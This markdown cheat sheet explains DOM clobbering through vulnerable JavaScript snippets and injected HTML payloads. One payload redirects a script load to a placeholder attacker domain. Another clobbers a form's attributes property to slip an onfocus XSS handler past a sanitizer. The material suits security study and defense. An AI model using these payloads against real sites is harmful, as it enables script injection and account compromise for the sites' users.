# DOM Clobbering

## Table of Contents

- [XSS](#xss)
- [Client-Side Protection Bypass](#client-side-protection-bypass)

## XSS

### A global variable that a script expects to be undefined can be replaced with an element, so script-free HTML ends up loading the attacker's script. [^1]

- Overriding a configuration object
    1. Script in the service
        ```javascript
        // Falls back to the default only when no configuration is defined
        const config = window.config || { scriptUrl: '/static/analytics.js' };
        const script = document.createElement('script');
        script.src = config.scriptUrl;
        document.body.appendChild(script);
        ```

    2. Injected markup
        ```html
        <a id="config"></a><a id="config" name="scriptUrl" href="https://[ATTACKER-DOMAIN]/x.js"></a>
        ```
    Two elements with the same `id` make `window.config` a collection, `config.scriptUrl` returns the element named `scriptUrl`, and assigning that element to `src` converts it to its `href`.

## Client-Side Protection Bypass

### A client-side sanitizer can be made to skip attributes it would otherwise remove. [^1]

- Clobbering the `attributes` property of a form
    1. Sanitizer in the service
        ```javascript
        // Removes every attribute that is not on the allowlist
        for (let i = node.attributes.length - 1; i >= 0; i--) {
            const name = node.attributes[i].name;
            if (!ALLOWED_ATTRIBUTES.includes(name)) {
                node.removeAttribute(name);
            }
        }
        ```

    2. Injected markup
        ```html
        <form id="x" tabindex="0" onfocus="alert(document.domain)"><input id="attributes"></form>
        ```
    `form.attributes` now returns the `<input>` element, whose `length` is undefined, so the loop never runs and `onfocus` is kept. Opening the page with `#x` in the URL focuses the form and runs the handler.
    - PortSwigger, [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)

[^1]: Applies when HTML can be injected but scripts are removed or blocked, for example by a sanitizer that keeps `id` and `name` attributes.
